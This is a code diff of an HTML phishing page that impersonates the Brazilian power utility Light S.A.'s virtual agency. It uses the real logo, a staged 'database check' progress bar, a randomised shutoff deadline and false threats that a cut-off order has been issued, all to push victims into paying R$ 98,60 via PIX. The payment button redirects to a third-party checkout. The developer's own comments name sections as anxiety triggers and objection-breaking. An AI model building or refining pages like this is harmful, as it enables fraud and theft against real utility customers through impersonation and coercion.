@@ -3,141 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Light - Segunda Via de Fatura</title>
+    <title>Agência Virtual - Light S.A.</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         body { font-family: 'Inter', sans-serif; }
+        .loader-bar {
+            width: 0%;
+            transition: width 0.4s ease-in-out;
+        }
+        .hidden-section { display: none; }
     </style>
 </head>
-<body class="bg-gray-50 min-h-screen">
+<body class="bg-gray-100 min-h-screen">
 
-    <!-- Header Clonado Light -->
-    <header class="bg-white shadow-sm border-b-4 border-orange-500">
+    <!-- Header Institucional Rigoroso -->
+    <header class="bg-white shadow-sm border-b-4 border-orange-600">
         <div class="max-w-7xl mx-auto px-4 py-3 flex justify-between items-center">
             <img src="https://www.light.com.br/SiteAssets/images/logo.png" alt="Light" class="h-12">
-            <nav class="hidden md:flex gap-6 text-sm font-medium text-gray-600">
-                <a href="#" class="hover:text-orange-500 transition">Serviços On-line</a>
-                <a href="#" class="hover:text-orange-500 transition">Informações</a>
-                <a href="#" class="hover:text-orange-500 transition">Atendimento</a>
+            <nav class="hidden md:flex gap-6 text-xs font-semibold text-gray-600 uppercase tracking-wider">
+                <a href="#" class="hover:text-orange-600 transition">Serviços On-line</a>
+                <a href="#" class="hover:text-orange-600 transition">Informações</a>
+                <a href="#" class="hover:text-orange-600 transition">Atendimento</a>
             </nav>
-            <button class="bg-orange-500 text-white px-4 py-2 rounded text-sm font-bold hover:bg-orange-600 transition">Agência Virtual</button>
+            <div class="flex items-center gap-3">
+                <span class="text-[10px] font-bold text-gray-400 uppercase hidden sm:block">Portal do Cliente</span>
+                <button class="bg-orange-600 text-white px-4 py-2 rounded text-xs font-bold hover:bg-orange-700 transition uppercase">Agência Virtual</button>
+            </div>
         </div>
     </header>
 
-    <main class="max-w-4xl mx-auto px-4 py-10">
-        <!-- Alerta de Urgência -->
-<div class="bg-red-700 text-white p-4 mb-8 flex items-start gap-3 rounded-lg shadow-2xl animate-pulse border-4 border-white">
-    <i data-lucide="alert-triangle" class="shrink-0 w-8 h-8"></i>
-    <div class="leading-tight">
-        <p class="font-black text-xl uppercase">⚠️ AVISO DE DESLIGAMENTO IMEDIATO</p>
-        <p class="text-sm font-bold">Sua unidade consumidora foi classificada como <span class="underline">Inadimplência Crítica</span>. A equipe técnica de corte já foi escalada para sua região. O fornecimento será interrompido em menos de 24h se o pagamento não for confirmado agora.</p>
-    </div>
-</div>
+    <main class="max-w-4xl mx-auto px-4 py-12">
+        
 
-        <!-- Card da Fatura -->
-        <div class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200">
-            <div class="bg-gray-800 text-white p-6 flex justify-between items-center">
-                <div>
-                    <h1 class="text-xl font-bold">Segunda Via de Fatura</h1>
-                    <p class="text-gray-400 text-sm">Referência: Novembro/2026</p>
+
+        <!-- SEÇÃO 2: PROCESSAMENTO (O GATILHO DE ANSIEDADE) -->
+        <div id="section-loading" class="hidden-section bg-white rounded-lg shadow-xl border border-gray-200 p-12 text-center">
+            <div class="max-w-sm mx-auto">
+                <div class="flex justify-center mb-6">
+                    <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-600"></div>
                 </div>
-                <div class="text-right">
-<p class="text-xs text-gray-400 uppercase font-bold">Valor para Regularização</p>
-<p id="display-valor" class="text-2xl font-black text-orange-500">R$ 98,60</p>
+                <h2 class="text-xl font-bold text-gray-800 mb-2">Processando Consulta...</h2>
+                <p id="loading-text" class="text-sm text-gray-500 mb-6">Acessando banco de dados da Light S.A.</p>
+                <div class="w-full bg-gray-200 rounded-full h-2.5">
+                    <div id="progress-bar" class="bg-orange-600 h-2.5 rounded-full loader-bar"></div>
                 </div>
             </div>
+        </div>
 
-            <div class="p-8">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                    <div class="space-y-1">
-                        <label class="text-xs text-gray-500 uppercase font-bold">Nome do Titular</label>
-                        <p id="display-nome" class="text-lg font-medium border-b pb-1 text-gray-800">Carregando...</p>
+        <!-- SEÇÃO 2.5: PRAZO DE CORTE (URGÊNCIA) -->
+        <div id="section-deadline" class="hidden-section bg-white rounded-lg shadow-xl border border-gray-200 p-12 text-center">
+            <div class="max-w-sm mx-auto">
+                <div class="flex justify-center mb-6">
+                    <div class="bg-red-100 p-4 rounded-full">
+                        <i data-lucide="calendar-off" class="text-red-600 h-12 w-12"></i>
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-xs text-gray-500 uppercase font-bold">CPF do Cliente</label>
-                        <p id="display-cpf" class="text-lg font-medium border-b pb-1 text-gray-800">...</p>
+                </div>
+                <h2 class="text-2xl font-black text-gray-800 mb-4 uppercase">Aviso de Interrupção</h2>
+                <p class="text-gray-600 mb-6 leading-relaxed">
+                    Identificamos que a sua Unidade Consumidora possui débitos pendentes. Para evitar a suspensão imediata do fornecimento de energia, a regularização deve ocorrer até:
+                </p>
+                <div class="bg-red-600 text-white py-4 rounded-lg text-2xl font-black mb-8 uppercase tracking-widest">
+                    <span id="deadline-date">--/--/----</span>
+                </div>
+                <button onclick="showResultPage()" class="w-full bg-gray-800 hover:bg-black text-white py-4 rounded-lg font-bold text-lg transition-all uppercase">
+                    Acessar Detalhes da Dívida
+                </button>
+            </div>
+        </div>
+
+        <div id="section-result" class="hidden-section">
+            <div class="bg-red-700 text-white p-4 mb-6 flex items-center gap-3 rounded shadow-lg">
+                <i data-lucide="alert-circle" class="shrink-0"></i>
+                <p class="text-sm font-bold uppercase tracking-tight">Status: Inadimplência Crítica - Ordem de Corte Emitida</p>
+            </div>
+
+            <div class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200">
+                <div class="bg-gray-800 text-white p-6 flex justify-between items-center">
+                    <div>
+                        <h1 class="text-xl font-bold">Detalhamento de Débitos</h1>
+                        <p class="text-gray-400 text-xs">Referência: Novembro/2026</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-xs text-gray-400 uppercase font-bold">Valor para Quitação</p>
+                        <p id="display-valor" class="text-2xl font-black text-orange-400">R$ 98,60</p>
                     </div>
                 </div>
 
-                <!-- Área do Boleto -->
-<div class="bg-gray-100 p-6 rounded-lg border-2 border-dashed border-gray-300 text-center">
-    <p class="text-sm text-gray-600 mb-4 font-medium">Linha Digitável para Pagamento</p>
-    <div class="bg-white p-4 rounded border shadow-inner font-mono text-lg text-gray-800 mb-6 break-all">
-        83640.70000 8 12345.678901 23456.789012 3 95421000000000
-    </div>
-    
-    <div class="flex flex-col gap-4">
-<button onclick="openTerms()" id="btn-pay" class="flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white px-6 py-4 rounded-lg font-black text-xl transition-all transform hover:scale-105 shadow-lg">
-    <i data-lucide="shield-check" size="24"></i> PAGAR AGORA R$ <span id="btn-valor">98,60</span>
-</button>
-        <p class="text-xs text-gray-500">Pagamento via PIX com baixa automática em até 30 minutos.</p>
-    </div>
-</div>
-        </div>
-<div class="mt-8 text-center text-gray-500 text-xs">
-    <p>A Light S.A. informa que a emissão de segunda via via portal é gratuita.</p>
-    <p class="mt-2">© 2026 Light S.A. - CNPJ 03.740.656/0001-10</p>
-</div>
+                <div class="p-8">
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                        <div class="space-y-1">
+                            <label class="text-xs text-gray-500 uppercase font-bold">Titular</label>
+                            <p id="display-nome" class="text-md font-semibold border-b pb-1 text-gray-800">...</p>
+                        </div>
+                        <div class="space-y-1">
+                            <label class="text-xs text-gray-500 uppercase font-bold">CPF</label>
+                            <p id="display-cpf" class="text-md font-semibold border-b pb-1 text-gray-800">...</p>
+                        </div>
+                        <div class="space-y-1">
 
-<!-- Modal de Termos e Persuasão -->
-<div id="terms-modal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center z-50 p-4">
-<div class="bg-white rounded-2xl max-w-md w-full overflow-hidden shadow-2xl border-2 border-orange-500">
-    <div class="bg-orange-600 p-4 text-white text-center font-black text-lg">
-        SISTEMA DE BAIXA AUTOMÁTICA - LIGHT S.A.
+                    </div>
+
+<div class="bg-red-50 p-6 rounded-lg border-2 border-red-500 text-center">
+                        <p class="text-red-600 mb-3 font-black uppercase text-sm tracking-tight">
+                            ⚠️ AVISO FINAL DE SUSPENSÃO
+                        </p>
+                        <p class="text-gray-700 text-sm leading-tight font-medium mb-4">
+                            O sistema de corte automático já foi programado. Para cancelar a ordem de desligamento <strong>imediatamente</strong> e evitar a taxa de religação (R$ 98,60), a quitação deve ser processada via PIX agora. 
+                            <span class="block mt-2 text-red-700 font-bold">Não há mais prazos administrativos.</span>
+                        </p>
+                    </div>
+                        <button onclick="openTerms()" class="w-full bg-green-600 hover:bg-green-700 text-white py-4 rounded-lg font-black text-xl transition-all shadow-lg uppercase tracking-tighter">
+                            Efetuar Pagamento via PIX
+                        </button>
+                        <p class="text-[10px] text-gray-400 mt-4 uppercase font-bold">Baixa automática em até 30 minutos via Gateway Shark</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Modal de Termos (Quebra de Objeção) -->
+    <div id="terms-modal" class="fixed inset-0 bg-black bg-opacity-80 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white rounded-lg max-w-md w-full overflow-hidden shadow-2xl">
+            <div class="bg-gray-800 p-4 text-white text-center font-bold uppercase text-sm">
+                Termo de Acordo Extrajudicial
+            </div>
+            <div class="p-6 space-y-4">
+                <div class="text-xs text-gray-600 h-48 overflow-y-auto border p-3 rounded bg-gray-50 leading-relaxed">
+                    <p class="font-bold text-gray-800 mb-2">Cláusulas de Regularização:</p>
+                    <p>1. O cliente reconhece a dívida no valor de <strong>R$ 98,60</strong> e concorda com a quitação imediata.</p>
+                    <p class="mt-2">2. A confirmação do pagamento via PIX suspende automaticamente a ordem de corte emitida para a Unidade Consumidora.</p>
+                    <p class="mt-2">3. A baixa no sistema da Light S.A. ocorre em tempo real após a validação do gateway de pagamento.</p>
+                    <p class="mt-2">4. O não cumprimento do pagamento neste ato implica na manutenção da ordem de desligamento e cobrança de taxas de religação.</p>
+                </div>
+                <div class="flex flex-col gap-3">
+                    <button onclick="payPix()" class="bg-green-600 text-white py-3 rounded font-bold hover:bg-green-700 transition-all uppercase text-sm">
+                        Concordo e Quero Regularizar Agora
+                    </button>
+                    <button onclick="closeTerms()" class="text-gray-400 text-xs hover:text-red-600 transition uppercase font-bold">Ignorar e Aceitar o Corte</button>
+                </div>
+            </div>
+        </div>
     </div>
-    <div class="p-6 space-y-4">
-        <div class="bg-red-50 p-3 rounded-lg border-l-4 border-red-600 text-sm text-red-800">
-            <strong class="block text-base">⚠️ ÚLTIMA OPORTUNIDADE</strong>
-            Este é o último passo antes da emissão da ordem de corte definitiva. O pagamento via PIX garante a baixa em 30 minutos e cancela a visita do técnico.
-        </div>
-        <div class="text-sm text-gray-600 h-40 overflow-y-auto border p-3 rounded bg-gray-50 font-medium">
-            <p class="font-bold text-gray-800 mb-2">Termos de Acordo Extrajudicial:</p>
-            <p>1. O cliente concorda com o valor de <strong>R$ 98,60</strong> para quitação total do débito em atraso.</p>
-            <p class="mt-2">2. A confirmação do pagamento via gateway Shark Automações suspende imediatamente a ordem de corte.</p>
-            <p class="mt-2">3. O não cumprimento deste pagamento agora resultará em multa administrativa e custos de religação.</p>
-            <p class="mt-2">4. Ao clicar em concordar, você autoriza a baixa automática do seu CPF no sistema da Light S.A.</p>
-        </div>
-        <div class="flex flex-col gap-3">
-            <button onclick="payPix()" class="bg-green-600 text-white py-4 rounded-lg font-black text-lg hover:bg-green-700 transition-all shadow-md">
-                CONCORDO E QUERO EVITAR O CORTE AGORA
-            </button>
-            <button onclick="closeTerms()" class="text-gray-400 text-xs hover:text-red-600 transition">Ignorar e aceitar a suspensão da energia</button>
-        </div>
-    </div>
-</div>
-</div>
 
     <script>
-        // Inicializa ícones do Lucide
         lucide.createIcons();
 
-        // Lógica de Espelhamento de URL String
-        window.onload = function() {
+        function startProcessing() {
+            document.getElementById('section-loading').classList.remove('hidden-section');
+
+            const steps = [
+                { p: 20, t: "Validando CPF no banco de dados..." },
+                { p: 40, t: "Localizando cadastro do cliente..." },
+                { p: 70, t: "Verificando pendências financeiras..." },
+                { p: 100, t: "Sincronizando com Central de Cortes..." }
+            ];
+
+            let currentStep = 0;
+            const interval = setInterval(() => {
+                if(currentStep < steps.length) {
+                    document.getElementById('progress-bar').style.width = steps[currentStep].p + '%';
+                    document.getElementById('loading-text').innerText = steps[currentStep].t;
+                    currentStep++;
+                } else {
+                    clearInterval(interval);
+                     const params = new URLSearchParams(window.location.search);
+                     showDeadline(params.get('cpf') || '***.***.***-**');
+                 }
+             }, 1200);
+         }
+
+         function showDeadline(cpf) {
+             document.getElementById('section-loading').classList.add('hidden-section');
+             document.getElementById('section-deadline').classList.remove('hidden-section');
+             
+             const today = new Date();
+             const daysToAdd = Math.floor(Math.random() * 3) + 2; 
+             today.setDate(today.getDate() + daysToAdd);
+             
+             const dateString = today.toLocaleDateString('pt-BR');
+             document.getElementById('deadline-date').innerText = dateString;
+         }
+
+        function showResultPage() {
             const params = new URLSearchParams(window.location.search);
-            
+            showResult(params.get('cpf') || '***.***.***-**', params.get('uc') || '');
+        }
+
+        function showResult(cpf, uc) {
+            const params = new URLSearchParams(window.location.search);
             const nome = params.get('nome') || 'Cliente Light';
-            const cpf = params.get('cpf') || '000.000.000-00';
-            const valor = params.get('valor') || '98,60';
 
             document.getElementById('display-nome').innerText = nome;
             document.getElementById('display-cpf').innerText = cpf;
-            document.getElementById('display-valor').innerText = 'R$ ' + valor;
-        };
 
-        function openTerms() {
-            document.getElementById('terms-modal').style.display = 'flex';
+            document.getElementById('section-deadline').classList.add('hidden-section');
+            document.getElementById('section-loading').classList.add('hidden-section');
+            document.getElementById('section-result').classList.remove('hidden-section');
+            lucide.createIcons();
         }
 
-        function closeTerms() {
-            document.getElementById('terms-modal').style.display = 'none';
-        }
+        function openTerms() { document.getElementById('terms-modal').style.display = 'flex'; }
+        function closeTerms() { document.getElementById('terms-modal').style.display = 'none'; }
 
-function payPix() {
-    // Redirecionamento direto para o checkout de pagamento solicitado
-    window.location.href = 'https://pay.sharkautomacoes.com/59a004c4';
-}
+        function payPix() {
+            window.location.href = 'https://pay.sharkautomacoes.com/59a004c4';
+        }
+        window.onload = startProcessing;
     </script>
 </body>
 </html>
